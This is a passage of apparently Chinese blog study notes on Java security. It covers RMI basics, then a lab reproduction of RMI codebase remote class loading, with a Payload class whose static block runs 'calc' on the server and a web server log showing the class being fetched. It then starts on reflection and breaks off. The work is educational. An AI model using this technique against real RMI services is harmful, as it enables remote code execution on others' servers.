class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.vulhub.RMI; <span class="hljs-comment">// 假设包名为 org.vulhub.RMI</span><br><br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-comment">// 【问题 3 解答】：为什么只有定义？</span><br>    <span class="hljs-comment">// C语言类比：这相当于 .h 头文件。</span><br>    <span class="hljs-comment">// Python类比：相当于抽象基类 (Abstract Base Class)。</span><br>    <span class="hljs-comment">// 作用：这是一份“契约/菜单”。客户端在本地没有服务端的具体代码，</span><br>    <span class="hljs-comment">// 但只要手里有这份接口定义，就知道服务端提供了什么方法，从而敢放心调用。</span><br>    <span class="hljs-comment">// extends Remote：这是 RMI 的硬性规定，标记该接口可被远程调用。</span><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteHelloWorld</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>        <span class="hljs-comment">// 必须抛出 RemoteException，因为网络通信是不可靠的，客户端需要处理网络错误</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    &#125;<br><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-comment">// 【问题 1 解答】：为什么定义内部类？为什么构造函数抛异常？</span><br>    <span class="hljs-comment">// 1. 内部类：纯粹为了省事（演示方便），不用新建一个 .java 文件。</span><br>    <span class="hljs-comment">//    就像 Python 在一个脚本里写多个 class。在真实工程中通常是独立文件。</span><br>    <span class="hljs-comment">// 2. 抛异常：这是 Java 特有的“检查型异常”机制。</span><br>    <span class="hljs-comment">//    父类 UnicastRemoteObject 的构造函数里做了 socket 监听操作，声明了“可能会报错”。</span><br>    <span class="hljs-comment">//    Java 编译器强制规定：子类在初始化父类（super()）时，必须对外声明同样的风险。</span><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteHelloWorld</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteHelloWorld</span> &#123;<br>        <br>        <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteHelloWorld</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>            <span class="hljs-built_in">super</span>(); <span class="hljs-comment">// 调用父类构造函数，开启随机端口监听 TCP 连接</span><br>        &#125;<br><br>        <span class="hljs-comment">// 实现接口中定义的方法</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>            <span class="hljs-comment">// 这行代码是在【服务端】执行的，只有服务端的控制台会打印</span><br>            System.out.println(<span class="hljs-string">&quot;call from&quot;</span>); <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello world&quot;</span>; <span class="hljs-comment">// 返回值会被序列化，通过网络传回给客户端</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 实例化对象。注意：此时它已经在随机端口监听 TCP 连接了（等待客户端的第二次连接）。</span><br>        <span class="hljs-type">RemoteHelloWorld</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>();<br>        <br>        <span class="hljs-comment">// 启动“电话查号台”（Registry），监听 1099 端口（客户端的第一次连接）。</span><br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <br>        <span class="hljs-comment">// ==========================================</span><br>        <span class="hljs-comment">// 【问题 2 解答】：rebind 只是注册，怎么知道调哪个方法？</span><br>        <span class="hljs-comment">// 类比：这里只是在电话黄页上登记： &quot;Hello&quot; -&gt; &quot;h 对象 (IP:Port)&quot;。</span><br>        <span class="hljs-comment">// Naming.rebind 只负责让客户端能“找到”这个对象。</span><br>        <span class="hljs-comment">// 至于客户端找到后是调用 hello() 还是其他方法，由客户端代码决定。</span><br>        <span class="hljs-comment">// ==========================================</span><br>        Naming.rebind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);<br>    &#125;<br><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-comment">// 【问题 4 解答】：为什么 main 函数定义在类里面？</span><br>    <span class="hljs-comment">// C语言类比：Java 不允许存在脱离 Class 的全局函数（没有 global scope）。</span><br>    <span class="hljs-comment">// 所以入口函数 main 只能“寄生”在某个类里。</span><br>    <span class="hljs-comment">// static 意味着它属于类本身，不依赖对象实例，约等于 C 的全局函数。</span><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIServer</span>().start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.vulhub.Train; <span class="hljs-comment">// 假设包名为 org.vulhub.Train</span><br><br><span class="hljs-comment">// ==========================================</span><br><span class="hljs-comment">// 【问题 5 解答】：现实场景中怎么引入源码？</span><br><span class="hljs-comment">// 现实中，Client 和 Server 分离（甚至在不同国家）。</span><br><span class="hljs-comment">// 做法：服务端开发者会把 IRemoteHelloWorld 接口（不包含实现类）编译并打成一个 .jar 包。</span><br><span class="hljs-comment">// 客户端下载这个 jar 包，import 进来，就能通过编译了。</span><br><span class="hljs-comment">// 这里因为演示代码在同一个工程里，所以直接 import 了服务端的类。</span><br><span class="hljs-comment">// ==========================================</span><br><span class="hljs-keyword">import</span> org.vulhub.RMI.RMIServer;<br><br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrainMain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <br>        <span class="hljs-comment">// ==========================================</span><br>        <span class="hljs-comment">// 【问题 6 解答】：为什么是实现接口，而不是实例化类？</span><br>        <span class="hljs-comment">// 核心原因：你不能 new 一个在别人电脑上的对象。</span><br>        <span class="hljs-comment">// Naming.lookup 返回的其实是一个“替身”（Stub/代理对象）。</span><br>        <span class="hljs-comment">// 这个替身在网络层面伪装成了服务端对象，在 Java 语法层面宣称自己实现了 IRemoteHelloWorld 接口。</span><br>        <span class="hljs-comment">// 所以我们强制转换成接口类型 (Interface)，而不是具体类 (Class)。</span><br>        <span class="hljs-comment">// ==========================================</span><br>        RMIServer.<span class="hljs-type">IRemoteHelloWorld</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (RMIServer.IRemoteHelloWorld) Naming.lookup(<span class="hljs-string">&quot;rmi://192.168.135.142:1099/Hello&quot;</span>);<br>        <br>        <span class="hljs-comment">// ==========================================</span><br>        <span class="hljs-comment">// 【问题 2 补充】：怎么知道调哪个方法？</span><br>        <span class="hljs-comment">// 在这里！客户端拿到了“替身” hello，代码里显式写了调用 .hello() 方法。</span><br>        <span class="hljs-comment">// “替身”会通过网络把这个请求（方法名、参数）发给服务端。</span><br>        <span class="hljs-comment">// ==========================================</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> hello.hello();<br>        <br>        System.out.println(ret);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>codebase：</p><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，与CLASSPATH很像，但是CLASSPATH是本地路径，而codebase通常是远程url。若我们指定codebase=<a href="http://example.com,然后加载org.test.example.example类,则java虚拟机会下载http//example.com/org/test/example/Example.class%EF%BC%8C%E5%B9%B6%E4%BD%9C%E4%B8%BAExample%E7%B1%BB%E7%9A%84%E5%AD%97%E8%8A%82%E7%A0%81%E3%80%82">http://example.com，然后加载org.test.example.Example类，则Java虚拟机会下载http://example.com/org/test/example/Example.class，并作为Example类的字节码。</a></p><p><font style="color:rgb(51,51,51);">RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。</font></p><h1 id="VnoKI">RMI利用</h1>在RMI中，如果我们可以控制codebase，那我们就可以去任意的加载我们的恶意类从而实现我们的想法。<p>但是官方也注意到了这个隐患，所以如果想通过codebase去利用，还需要：</p><ul><li>安装并配置了SecurityManager</li><li>Java版本低于7u21、6u45，或者设置了java.rmi.server.useCodebaseOnly=false</li></ul><p>若java.rmi.server.useCodebaseOnly为true，则Java虚拟机只信任预先配置好的codebase，不再支持从RMI请求中获取</p><p>复现流程：</p><p>首先我的目录是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">rmitest<br>├─ .gitignore<br>├─ Calc.class<br>├─ Calc.java<br>├─ client.policy<br>├─ ICalc.class<br>├─ ICalc.java<br>├─ RemoteRMIServer.class<br>├─ RemoteRMIServer.java<br>├─ RMIClient.java<br>├─ rmitest.iml<br>└─ client<br>   ├─ ICalc.class<br>   ├─ RMIClient$Payload.class<br>   └─ RMIClient.class<br></code></pre></td></tr></table></figure><p>然后是每个文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">Calc.java<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;&#125;<br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">sum</span><span class="hljs-params">(List&lt;Integer&gt; params)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (Integer param : params) &#123;<br>            sum += param;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sum;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">ICalc.java<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICalc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">sum</span><span class="hljs-params">(List&lt;Integer&gt; params)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">client.policy<br>grant &#123;<br>    permission java.security.AllPermission;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">RemoteRMIServer.java<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteRMIServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;setup SecurityManager&quot;</span>);<br>            System.setProperty(<span class="hljs-string">&quot;java.security.policy&quot;</span>,<span class="hljs-string">&quot;D:\\javasec\\javaproject\\rmitest\\client.policy&quot;</span>);<br>            System.setProperty(<span class="hljs-string">&quot;java.rmi.server.hostname&quot;</span>,<span class="hljs-string">&quot;10.252.92.135&quot;</span>);<br>            System.setProperty(<span class="hljs-string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>,<span class="hljs-string">&quot;false&quot;</span>);<br>            System.setSecurityManager(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityManager</span>());<br>        &#125;<br>        <span class="hljs-type">Calc</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calc</span>();<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Naming.rebind(<span class="hljs-string">&quot;refObj&quot;</span>, h);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteRMIServer</span>().start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">RMIClient.java<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Payload</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ArrayList</span>&lt;Integer&gt; &#123;<br><br>        <span class="hljs-keyword">static</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;Pwned! I am running on Server!&quot;</span>);<br><br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;&#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lookup</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        System.setProperty(<span class="hljs-string">&quot;java.rmi.server.codebase&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>);<br><br>        <span class="hljs-type">ICalc</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (ICalc)Naming.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/refObj&quot;</span>);<br>        List&lt;Integer&gt; li = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Payload</span>();<br>        li.add(<span class="hljs-number">3</span>);<br>        li.add(<span class="hljs-number">4</span>);<br>        System.out.println(r.sum(li));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIClient</span>().lookup();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后在根目录下执行<code>javac *.java</code>编译所有文件，编译好了之后按照我的文件树放置文件。其实主要就2点,<code>RemoteRMIServer.class</code> 目录下没有<code>RMIClient.class</code>和<code>RMIClient$Payload.class</code>，然后client目录下得有<code>ICalc.class</code>这个接口类。然后在client下开启web服务。</p><p>服务端执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">D:\javasec\javaproject\rmitest&gt;java RemoteRMIServer<br>setup SecurityManager<br>Pwned! I am running on Server!<br></code></pre></td></tr></table></figure><p>client目录下执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">D:\javasec\javaproject\rmitest\client&gt;java -Djava.rmi.server.useCodebaseOnly=<span class="hljs-literal">false</span> -Djava.rmi.server.codebase=http:<span class="hljs-comment">//10.252.92.135/ -Djava.security.policy=client.policy RMIClient</span><br>Pwned! I am running on Server!<br><span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>同样的client目录下开启web服务：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">D:\javasec\javaproject\rmitest\client&gt;python -m http.server <span class="hljs-number">80</span><br>Serving HTTP on :: port <span class="hljs-number">80</span> (http:<span class="hljs-comment">//[::]:80/) ...</span><br>::ffff:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> - - [<span class="hljs-number">16</span>/Dec/<span class="hljs-number">2025</span> 09:<span class="hljs-number">19</span>:<span class="hljs-number">10</span>] <span class="hljs-string">&quot;GET /RMIClient$Payload.class HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br></code></pre></td></tr></table></figure><p>gemini的指导：</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/57713373/1765848707635-7b554918-7eb5-426c-a320-bcc3a6b2c2c7.png"></p><p>序列化数据复现：</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/57713373/1765848445653-abe5f96a-bfb3-49c1-aba8-0f64793ef301.png"></p><p>目前还没学习反序列化，就没去复现了。</p><p>表述能力有限，建议各位还是看p神星球里的pdf。在pdf中p神详细讲述了RMI中的序列化数据</p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
      <category>javasec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javasec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java安全学习笔记1</title>
    <link href="/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
    <url>/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
    
    <content type="html"><![CDATA[<h1 id="tEXqB">基础知识</h1><p><strong>反射</strong>：在运行时根据传入的字符串来决定执行哪个类的哪个方法</p><p><strong>在Java安全中，这四个方法尤为重要</strong></p><ol><li><code>Class.forName()</code>:获取一个类（作为入口）</li><li><code>newInstance()</code>：实例化这个类，相当于<code>new ClassName()</code>,因为普通方法必须是由对象才能使用</li><li><code>getMethod()</code>：获取类中的某个函数（公共的）</li><li><code>invoke()</code>：执行这个函数</li></ol><p><strong>获取Class对象的三种方式：</strong></p><ol><li><code>obj.getclass()</code>：需要手里有了一个对象实例，如<code>&quot;abc&quot;.getClass()</code></li><li><code>Test.class</code>: 代码编译时就需要引入这个类（静态的）</li><li><code>Class.forName(&quot;类名&quot;)</code>：只需知道类的名字，就能获取类</li></ol><hr><p><strong>关于Class.forName的一个误区</strong></p><p><strong>1. <strong><code>forName</code></strong> 的重载</strong><br><code>Class.forName(&quot;String&quot;)</code> 实际上是调用了：<br><code>Class.forName(&quot;String&quot;, true, currentLoader)</code></p><p>这里的 <code>true</code> 代表参数 <code>initialize</code>（是否初始化）。</p><p><strong>2. 初始化的真正含义</strong><br>很多人以为“初始化”等于“执行构造函数”，<strong>这是错的</strong>。<br>文档通过 <code>TrainPrint</code> 类的实验证明了执行顺序：</p><ol><li><code>static &#123;&#125;</code>** (静态代码块)<strong>：在</strong>类初始化**时执行（即 <code>Class.forName</code> 时）。</li><li><code>&#123;&#125;</code>** (构造代码块)<strong>：在</strong>实例化**对象时执行（即 <code>newInstance</code> 时）。</li><li><code>public TrainPrint()</code>** (构造函数)<strong>：在</strong>实例化**对象时执行，且在 <code>&#123;&#125;</code> 之后。</li></ol><p><strong>结论：</strong><br>当调用 <code>Class.forName(&quot;某各类&quot;)</code> 时，<strong>不需要</strong>实例化该对象（不需要 <code>newInstance</code>），该类中的 <code>static &#123;&#125;</code> 静态代码块就会被立即执行！</p><hr><p><strong>重载：</strong></p><p>Java中同一个方法，但是接收的参数不一样。如吃饭：</p><ol><li>吃饭（无参数）：去食堂随便吃点</li><li>吃饭（苹果）：我要吃苹果</li><li>吃饭（牛排+刀叉）：我要用刀叉吃牛排</li></ol><p>而为了方便记忆，你不用去记eatrice，eatapple，eatsteak，只用记eat就行，Java会根据你传的参数自动判断</p><p>比如Runtime类的exec方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Runtime</span> &#123;<br><br>    <span class="hljs-comment">// 版本 1：只接受一个字符串（最简单的命令）</span><br>    <span class="hljs-comment">// 比如：exec(&quot;calc.exe&quot;)</span><br>    <span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String command)</span> &#123; ... &#125;<br><br>    <span class="hljs-comment">// 版本 2：接受一个字符串数组</span><br>    <span class="hljs-comment">// 比如：exec(new String[]&#123;&quot;echo&quot;, &quot;hello&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String[] cmdarray)</span> &#123; ... &#125;<br><br>    <span class="hljs-comment">// 版本 3：接受命令，还接受环境变量</span><br>    <span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String command, String[] envp)</span> &#123; ... &#125;<br><br>    <span class="hljs-comment">// ... 还有好几个版本 ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>为什么要在反射中提重载，因为在通过getMethod拿方法时，需要精确指定参数类型，来告诉Java你要的哪个版本。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 错误写法</span><br>Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>); <br><span class="hljs-comment">//正确写法</span><br>getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class)<br></code></pre></td></tr></table></figure><hr><p><strong>内部类：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 这个就是 C1 (外部类/袋鼠妈妈)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">C1</span> &#123;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;我是袋鼠妈妈，我在跑&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 这个就是 C2 (内部类/小袋鼠)</span><br>    <span class="hljs-comment">// 注意：它是写在 C1 的大括号里面的！</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">C2</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sleep</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;我是小袋鼠，我在睡觉&quot;</span>);<br>        &#125;<br>    